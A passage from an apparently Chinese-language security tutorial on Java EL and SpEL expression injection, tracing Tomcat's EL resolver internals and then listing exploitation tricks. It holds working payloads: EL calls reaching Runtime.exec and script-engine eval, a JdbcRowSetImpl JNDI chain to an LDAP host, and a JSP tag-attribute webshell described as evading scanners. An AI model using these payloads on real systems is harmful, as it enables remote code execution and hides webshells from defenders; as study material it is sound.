<h4 id="BeanELResolver-getValue"><a href="#BeanELResolver-getValue" class="headerlink" title="BeanELResolver#getValue"></a>BeanELResolver#getValue</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getServletContext:585, PageContextImpl (org.apache.jasper.runtime)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">getValue:99, BeanELResolver (javax.el)</span><br><span class="line">getValue:112, JasperELResolver (org.apache.jasper.el)</span><br><span class="line">getTarget:108, AstValue (org.apache.el.parser)</span><br><span class="line">setValue:195, AstValue (org.apache.el.parser)</span><br><span class="line">getValue:35, AstAssign (org.apache.el.parser)</span><br><span class="line">getValue:189, ValueExpressionImpl (org.apache.el)</span><br><span class="line">proprietaryEvaluate:942, PageContextImpl (org.apache.jasper.runtime)</span><br><span class="line">_jspService:3, index_jsp (org.apache.jsp)</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="BeanELResolver-setValue"><a href="#BeanELResolver-setValue" class="headerlink" title="BeanELResolver#setValue"></a>BeanELResolver#setValue</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">setPathname:131, StandardManager (org.apache.catalina.session)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">setValue:126, BeanELResolver (javax.el)</span><br><span class="line">setValue:155, CompositeELResolver (javax.el)</span><br><span class="line">setValue:201, AstValue (org.apache.el.parser)</span><br><span class="line">getValue:35, AstAssign (org.apache.el.parser)</span><br><span class="line">getValue:189, ValueExpressionImpl (org.apache.el)</span><br><span class="line">proprietaryEvaluate:942, PageContextImpl (org.apache.jasper.runtime)</span><br><span class="line">_jspService:3, index_jsp (org.apache.jsp)</span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 设置 EL 属性的值。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;遵循 ELResolver 规范的典型实现流程：</span></span><br><span class="line"><span class="comment"> * 1) 校验入参；2) base 或 property 为空则表明本解析器不处理，直接返回；</span></span><br><span class="line"><span class="comment"> * 3) 标记已解析（setPropertyResolved）；4) 若只读则抛出不可写异常；</span></span><br><span class="line"><span class="comment"> * 5) 通过属性元数据查找写方法（setter）；6) 反射调用 setter；</span></span><br><span class="line"><span class="comment"> * 7) 将底层异常包装成 ELException 抛出。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> context  EL 上下文，不能为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> base     目标对象（属性所属的对象）。为 null 表示本解析器不负责该属性</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> property 属性名或属性标识。为 null 表示本解析器不负责该属性</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value    要设置的属性值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> PropertyNotWritableException 当解析器处于只读模式或属性不可写时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ELException                  当调用 setter 过程中发生异常时包装并抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(ELContext context, Object base, Object property, Object value)</span> &#123;</span><br><span class="line">    <span class="comment">// 1) 基本参数校验：ELContext 不能为空</span></span><br><span class="line">    Objects.requireNonNull(context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 按 EL 规范：如果 base 或 property 为 null，说明当前解析器不负责处理，直接返回</span></span><br><span class="line">    <span class="comment">//    这样链上的其他 ELResolver 仍有机会处理该属性。</span></span><br><span class="line">    <span class="keyword">if</span> (base == <span class="literal">null</span> || property == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 告诉 ELContext：当前解析器已经解析（处理）了该 (base, property)，</span></span><br><span class="line">    <span class="comment">//    这样后续的解析器就不会再次尝试处理，避免重复或冲突。</span></span><br><span class="line">    context.setPropertyResolved(base, property);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 只读检查：若解析器配置为只读，则不允许写入，抛出标准异常并携带本地化消息。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.readOnly) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyNotWritableException</span>(</span><br><span class="line">                Util.message(context, <span class="string">&quot;resolverNotWritable&quot;</span>, base.getClass().getName()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 通过属性元数据获取写方法（setter）。此处通常来自于对属性的描述（如 PropertyDescriptor）。</span></span><br><span class="line">    <span class="comment">//    .write(context, base) 返回可反射调用的 java.lang.reflect.Method。</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> <span class="built_in">this</span>.property(context, base, property).write(context, base);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 6) 反射调用 setter：等价于 base.setXxx(value)</span></span><br><span class="line">        m.invoke(base, value);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">        <span class="comment">// 7a) 如果 setter 内部抛出异常，JDK 会把原始异常包在 InvocationTargetException 中。</span></span><br><span class="line">        <span class="comment">//     这里先取出真正的根因，并交给 Util 进行“致命错误”处理（如 ThreadDeath / VirtualMachineError）。</span></span><br><span class="line">        <span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> e.getCause();</span><br><span class="line">        Util.handleThrowable(cause);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 然后将其包装为 ELException 抛出，并带上友好的本地化消息（含类型名与属性名）。</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ELException</span>(</span><br><span class="line">                Util.message(context, <span class="string">&quot;propertyWriteError&quot;</span>,</span><br><span class="line">                        base.getClass().getName(), property.toString()),</span><br><span class="line">                cause);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// 7b) 其他反射相关异常（如 IllegalAccessException、IllegalArgumentException 等）</span></span><br><span class="line">        <span class="comment">//     统一包装为 ELException 抛出，避免向上层泄漏反射细节。</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ELException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span></span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Web路径</span></span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="string">&quot;&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件头参数</span></span><br><span class="line">$&#123;header&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取webRoot</span></span><br><span class="line">$&#123;applicationScope&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="方括号执行函数"><a href="#方括号执行函数" class="headerlink" title="方括号执行函数"></a>方括号执行函数</h3><p>在 EL 中，<code>[]</code> 本质上也是在获取属性，因此下面两个 EL 表达式是等价的：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass()&#125; == $&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;getClass&#x27;</span>]()&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中对于下面这个 EL 表达式：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123; <span class="string">&#x27;&#x27;</span> [<span class="string">&#x27;getClass&#x27;</span>] () &#125;</span><br></pre></td></tr></table></figure></div>

<p>解析器把它拆成一串节点：<code>AstValue</code>（根）下面依次是 <code>AstBracketSuffix</code>、<code>AstMethodParameters</code>。</p>
<ul>
<li><strong>base</strong>：<code>&#39;&#39;</code>（空字符串，类型是 <code>java.lang.String</code>）</li>
<li><strong>AstBracketSuffix</strong>：<code>[&#39;getClass&#39;]</code>（方括号里的内容先被当成一个表达式求值，结果是字符串 <code>&quot;getClass&quot;</code>）</li>
<li><strong>AstMethodParameters</strong>：<code>()</code>（方法参数，这里为空）</li>
</ul>
<p>在 <code>AstValue#getValue(ctx)</code> 函数中：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (base != <span class="literal">null</span> &amp;&amp; i &lt; propCount) &#123;</span><br><span class="line">    <span class="comment">// 取下一个“后缀”节点的值</span></span><br><span class="line">    suffix = <span class="built_in">this</span>.children[i].getValue(ctx);   <span class="comment">// ← 这里拿到 &quot;getClass&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果“下一个”的下一个节点是参数列表 AstMethodParameters，说明这是一次“方法调用”</span></span><br><span class="line">    <span class="keyword">if</span> (i + <span class="number">1</span> &lt; propCount &amp;&amp; (<span class="built_in">this</span>.children[i+<span class="number">1</span>] <span class="keyword">instanceof</span> AstMethodParameters)) &#123;</span><br><span class="line">        <span class="type">AstMethodParameters</span> <span class="variable">mps</span> <span class="operator">=</span> (AstMethodParameters) <span class="built_in">this</span>.children[i+<span class="number">1</span>];</span><br><span class="line">        Object[] paramValues = mps.getParameters(ctx); <span class="comment">// 这里是空数组</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 真正调用：通过 ELResolver#invoke 反射执行 base.suffix(paramValues)</span></span><br><span class="line">        base = resolver.invoke(ctx, base, suffix,</span><br><span class="line">                               getTypesFromValues(paramValues), paramValues);</span><br><span class="line">        i += <span class="number">2</span>; <span class="comment">// 跨过方法名后缀和参数两个节点</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 否则按属性/索引取值...</span></span><br><span class="line">        ...</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> base;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>初始 <code>base = &quot;&quot;</code></li>
<li><code>suffix = &quot;getClass&quot;</code></li>
<li><code>paramValues = []</code></li>
<li>调用后 <code>base = &quot;&quot;.getClass()</code>，得到 <code>java.lang.Class&lt;java.lang.String&gt;</code>，循环结束返回这个结果。</li>
</ul>
<p>利用这一特性，我们可以将要获取的属性以及要调用的函数名以字符串的形式表示在 EL 表达式中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval()&#125;</span><br><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;getClass&#x27;</span>]()[<span class="string">&#x27;forName&#x27;</span>](<span class="string">&#x27;javax.script.ScriptEngineManager&#x27;</span>)[<span class="string">&#x27;newInstance&#x27;</span>]()[<span class="string">&#x27;getEngineByName&#x27;</span>](<span class="string">&#x27;js&#x27;</span>)[<span class="string">&#x27;eval&#x27;</span>]()&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后我们就可以通过字符串拼接、编码等形式进行隐藏或者像下面这样通过参数传递进行动态调用：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;&quot;</span>[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)</span><br></pre></td></tr></table></figure></div>

<h3 id="getter-setter-函数调用"><a href="#getter-setter-函数调用" class="headerlink" title="getter&#x2F;setter 函数调用"></a>getter&#x2F;setter 函数调用</h3><p>在前面<strong>属性访问（AstAssign）</strong>的分析中我们可以得出结论：<strong>EL 表达式中点号属性取值相当于执行对象的 getter 方法；等号属性赋值则等同于执行 setter 方法。</strong></p>
<p>因此我们可以复用 FastJson 的反序列化利用思想，通过一系列的 getter 或 setter 函数的调用完成利用。例如：</p>
<ul>
<li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code>：任意字节码加载</li>
<li><code>com.sun.rowset.JdbcRowSetImpl#setAutoCommit</code>：JNDI</li>
</ul>
<p>不过 FastJson 利用中需要对一个对象多次调用 setter 或 getter 方法来设置属性和触发利用。为了在 EL 表达式中同样满足这一条件，我们需要借助 EL 表达式的多语句执行的特性：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">    pageContext.setAttribute(<span class="string">&quot;obj&quot;</span>,<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>).newInstance());</span><br><span class="line">    pageContext.getAttribute(<span class="string">&quot;obj&quot;</span>).dataSourceName=<span class="string">&quot;ldap://127.0.0.1:9999/exp&quot;</span>;</span><br><span class="line">    pageContext.getAttribute(<span class="string">&quot;obj&quot;</span>).autoCommit=<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="标签中的EL表达式"><a href="#标签中的EL表达式" class="headerlink" title="标签中的EL表达式"></a>标签中的EL表达式</h3><p> EL 表达式不仅可以放到 jsp 的 body 里，也可以插入到各种的标签中：</p>
<div class="code-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:useBean id=<span class="string">&quot;test&quot;</span> type=<span class="string">&quot;java.lang.Class&quot;</span></span><br><span class="line">             beanName=<span class="string">&quot;$&#123;Runtime.getRuntime().exec(param.cmd)&#125;&quot;</span>&gt;&lt;/jsp:useBean&gt;</span><br></pre></td></tr></table></figure></div>

<p>类似的还有 <code>&lt;jsp:param value=&quot;$&#123;...&#125;&quot;/&gt;</code>、<code>&lt;jsp:include page=&quot;$&#123;...&#125;&quot;/&gt;</code> 等，凡是该属性在 TLD 中标成 <code>rtexprvalue=&quot;true&quot;</code> 的，属性值里写 <code>$&#123;...&#125;</code> 就会被当作 <strong>运行期表达式</strong> 求值；否则按字面量处理。</p>
<p>在将 JSP 转换成 Java 代码的过程中有如下调用栈：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.jasper.compiler.JspUtil.interpreterCall(JspUtil.java:362)</span><br><span class="line">at org.apache.jasper.compiler.ELInterpreterFactory$DefaultELInterpreter.interpreterCall(ELInterpreterFactory.java:103)</span><br><span class="line">at org.apache.jasper.compiler.Generator$GenerateVisitor.attributeValue(Generator.java:970)</span><br><span class="line">at org.apache.jasper.compiler.Generator$GenerateVisitor.visit(Generator.java:1445)</span><br><span class="line">at org.apache.jasper.compiler.Node$UseBean.accept(Node.java:1183)</span><br><span class="line">at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2381)</span><br><span class="line">at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2437)</span><br><span class="line">at org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2443)</span><br><span class="line">at org.apache.jasper.compiler.Node$Root.accept(Node.java:467)</span><br><span class="line">at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2381)</span><br><span class="line">at org.apache.jasper.compiler.Generator.generate(Generator.java:3574)</span><br><span class="line">at org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:254)</span><br><span class="line">at org.apache.jasper.compiler.Compiler.compile(Compiler.java:375)</span><br><span class="line">at org.apache.jasper.compiler.Compiler.compile(Compiler.java:351)</span><br><span class="line">at org.apache.jasper.compiler.Compiler.compile(Compiler.java:335)</span><br><span class="line">at org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:597)</span><br><span class="line">at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:398)</span><br><span class="line">at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:383)</span><br><span class="line">at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:331)</span><br><span class="line">at javax.servlet.http.HttpServlet.service(HttpServlet.java:583)</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>org.apache.jasper.compiler.JspUtil#interpreterCall</code> 函数将属性中的 EL 表达式转换为实际解析 EL 表达式的代码：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StringBuilder</span> <span class="variable">call</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(</span><br><span class="line">        <span class="string">&quot;(&quot;</span></span><br><span class="line">                + returnType</span><br><span class="line">                + <span class="string">&quot;) &quot;</span></span><br><span class="line">                + <span class="string">&quot;org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate&quot;</span></span><br><span class="line">                + <span class="string">&quot;(&quot;</span> + Generator.quote(expression) + <span class="string">&quot;, &quot;</span> + targetType</span><br><span class="line">                + <span class="string">&quot;.class, &quot;</span> + <span class="string">&quot;(javax.servlet.jsp.PageContext)&quot;</span> + jspCtxt + <span class="string">&quot;, &quot;</span></span><br><span class="line">                + fnmapvar + <span class="string">&quot;)&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>也就是会转换成：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(java.lang.String) org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate(</span><br><span class="line">    <span class="string">&quot;$&#123;Runtime.getRuntime().exec(param.cmd)&#125;&quot;</span>, </span><br><span class="line">    java.lang.String.class, </span><br><span class="line">    (javax.servlet.jsp.PageContext)_jspx_page_context,</span><br><span class="line">    <span class="literal">null</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>很多轻量级 WebShell 引擎&#x2F;扫描器只是<strong>把 JSP 当模板文本或 XML 解析</strong>，不会走 Jasper 的 AST&#x2F;EL 编译路径；<br>于是属性中的 <code>$&#123;...&#125;</code> 被当作普通字符串忽略。<strong>真实容器中却会执行</strong>，造成偏差。我们可利用这一点绕过“只查 body、不查属性”的拦截&#x2F;审计规则。</p>
<h3 id="结合-JS-引擎"><a href="#结合-JS-引擎" class="headerlink" title="结合 JS 引擎"></a>结合 JS 引擎</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>)&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h1><p><strong>SpEL（Spring Expression Language）</strong> 是 Spring 自带的表达式语言，它的作用类似于 JSP&#x2F;EL、OGNL、MVEL，能够在运行时动态计算表达式。它不仅能访问对象属性，还能调用方法、执行逻辑运算、正则匹配、构造新对象、调用静态方法等等。</p>
<p>SpEL 在 Spring 3.0 引入，用于 <strong>Spring 容器配置</strong>（XML&#x2F;注解）、<strong>Spring Security 表达式控制</strong>、**@Value 动态取值** 等场景。与 <strong>标准 EL（javax.el）&#x2F; JSP EL</strong> 的相比，SpEL 提供更多能力（<code>T()</code> 访问类型&#x2F;静态成员、<code>@bean</code> 引用、<code>new</code> 对象、集合选择&#x2F;投影、函数注册等），可脱离 JSP 使用；标准 EL 偏向视图层规范化。</p>
<h2 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h3><p>SpEL使用 <code>#&#123;...&#125;</code> 作为定界符，大括号内被视为 SpEL 表达式，里面可以使用运算符，变量，调用方法等。使用 <code>T()</code> 运算符会调用类作用域的方法和常量，如 <code>#&#123;T(java.lang.Math)&#125;</code> 返回一个 <code>java.lang.Math</code> 类对象</p>
<p><code>#&#123;&#125;</code> 和 <code>$&#123;&#125;</code> 的区别：</p>
<ul>
<li><code>#&#123;...&#125;</code>：<strong>SpEL 表达式</strong>。能做运算、方法调用、类型引用 <code>T(...)</code>、访问 Spring 容器里 Bean <code>@beanName</code>、变量 <code>#var</code> 等。</li>
<li><code>$&#123;...&#125;</code>：<strong>属性占位符</strong>（Property Placeholder）。从 <strong>application.properties &#x2F; yaml、系统属性、环境变量</strong>等 <code>PropertySources</code> 里取值，不做计算。</li>
</ul>
<p>可混用：<code>#&#123;&quot;$&#123;prop&#125;&quot;.toUpperCase()&#125;</code>（先占位符，再作为字符串参与 SpEL 计算）。</p>
<p><strong>字面量与运算</strong></p>
<ul>
<li><p>字符串&#x2F;数字&#x2F;布尔&#x2F;空：<code>&#39;abc&#39;</code>, <code>123</code>, <code>true</code>, <code>null</code></p>
</li>
<li><p>算术&#x2F;关系&#x2F;逻辑：<code>+ - * / %</code>, <code>== != &lt; &gt; &lt;= &gt;=</code>, <code>and or not</code></p>
<ul>
<li>也可用关键字等价：<code>eq ne lt gt le ge</code></li>
</ul>
</li>
<li><p>正则匹配：<code>&#39;abc&#39; matches &#39;a.*&#39;</code>  （Java 正则）</p>
</li>
<li><p>三目与 Elvis：<code>cond ? a : b</code>，<code>name ?: &#39;anonymous&#39;</code></p>
</li>
<li><p>安全导航：<code>user?.address?.city</code>（遇 <code>null</code> 则整个链返回 <code>null</code>）</p>
</li>
</ul>
<p><strong>方法、属性、构造</strong></p>
<ul>
<li><p>调用方法：<code>&#39;abc&#39;.toUpperCase()</code></p>
</li>
<li><p>访问&#x2F;设置属性：<code>order.customer.name</code></p>
<ul>
<li>可写上下文里也可赋值：<code>name = &#39;bob&#39;</code>（需要目标可写）</li>
</ul>
</li>
<li><p><strong>类型引用&#x2F;静态成员</strong>：<code>T(java.lang.Math).random()</code>，<code>T(java.time.Duration).ofSeconds(5)</code></p>
<ul>
<li><strong><code>T(Type)</code> 是 SpEL 的类型运算符</strong>，得到 <code>java.lang.Class</code> 对象并可访问静态字段&#x2F;方法</li>
<li>默认类型定位器导入了 <strong><code>java.lang</code> 包</strong>，因此可写 <code>T(String)</code>, <code>T(Math)</code>, <code>T(Runtime)</code>（等价于全限定名）</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>这里就已经存在潜在攻击面：<code>Rumtime</code> 类也是包含在 <code>java.lang</code> 包中的，因此如果我们能调用 <code>Runtime.getRuntime.exec(payload)</code> 即可进行命令执行。</p>
<p><code>T(Type)</code>、<code>new ...</code>、方法调用等<strong>在默认的 <code>StandardEvaluationContext</code> 可用</strong>；<br>使用 <strong><code>SimpleEvaluationContext</code></strong> 时，这些危险能力通常被禁用&#x2F;裁剪。</p>

    </div>
  </div>
</li>
<li><p>构造对象：<code>new java.util.Date()</code>，<code>new int[]&#123;1,2,3&#125;</code>，<code>new int[2][3]</code></p>
</li>
</ul>
<p><strong>集合与筛选&#x2F;投影</strong></p>
<ul>
<li>集合字面量（List）：<code>&#123;1,2,3&#125;</code></li>
<li>Map 字面量：<code>&#123;&#39;k&#39;:&#39;v&#39;, &#39;x&#39;: 1&#125;</code></li>
<li><strong>选择（过滤）</strong>：<code>list.?[age &gt; 18]</code>（返回所有匹配元素）</li>
<li><strong>投影</strong>：<code>list.![name]</code>（把每个元素映射成其 <code>name</code>）</li>
<li><strong>首&#x2F;尾匹配</strong>：<code>list.^[predicate]</code>（第一个匹配），<code>list.$[predicate]</code>（最后一个匹配）</li>
</ul>
<p><strong>变量</strong></p>
<ul>
<li><p>在上下文里放变量：<code>context.setVariable(&quot;x&quot;, 42)</code> → 表达式里用 <strong><code>#x</code></strong></p>
</li>
<li><p>内置变量：</p>
<ul>
<li><code>#root</code>：根对象（不随子表达式变化）</li>
<li><code>#this</code>：当前上下文对象（在选择&#x2F;投影等子表达式中会变为当前元素）</li>
</ul>
</li>
</ul>
<p><strong>Spring 生态特有</strong></p>
<ul>
